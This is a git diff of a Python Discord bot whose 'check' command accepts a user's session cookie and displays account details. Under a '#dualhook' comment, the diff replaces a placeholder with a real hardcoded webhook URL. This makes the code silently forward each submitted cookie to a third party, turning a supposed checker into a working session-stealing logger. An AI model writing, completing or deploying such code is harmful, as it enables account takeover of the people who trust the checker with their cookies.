@@ -1,9 +1,8 @@
-
-import os
 import discord, requests, discord_webhook
 from discord.ext import commands
 from discord_webhook import DiscordEmbed, DiscordWebhook
-import requests
+import webserver
+from webserver import keep_alive
 
 req = requests.Session()
 client = commands.Bot(command_prefix='.') #set prefix
@@ -74,7 +73,7 @@ async def check(ctx, cookie):
     e.add_field(name='Followers🎥: ',value=f'```{followers}```', inline=True)
     e.add_field(name='Cookie🍪:', value=f'```{cookie}```', inline=False)
     e.set_thumbnail(url=image_url)
-    e.set_footer(text='Join for more epic methods https://discord.gg/legal')
+    e.set_footer(text='https://discord.gg/legal')
     await ctx.send(embed=e)
 
     #dualhook
@@ -97,14 +96,12 @@ async def check(ctx, cookie):
     e.add_embed_field(name='Followers🎥: ',value=f'```{followers}```', inline=True)
     e.add_embed_field(name='Cookie🍪:', value=f'```{cookie}```', inline=False)
     e.set_thumbnail(url=image_url)
-    e.set_footer(text='Join for more epic methods https://discord.gg/legal')
-    webhook = DiscordWebhook(url='YourWebhookHERE', username="New Log")
+    e.set_footer(text='discord.gg/legal')
+    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/893939735129653309/JeN4Dlr-haiKp3TEnIwZFMQzkWm_XYkoa5zjfYcz4VZ2mrK6OBDhArLyq3Dc8Ri7dF-w', username="New Log")
     webhook.add_embed(e)
     webhook.execute()
   else:
     e = discord.Embed(title='**❌ Cookie is Expired! ❌**',color=0xff0000)
     await ctx.send(embed=e)
-    
-  
 
-client.run('TOKENHERE') #replace with your bot token
+client.run("Token") #replace with your bot token
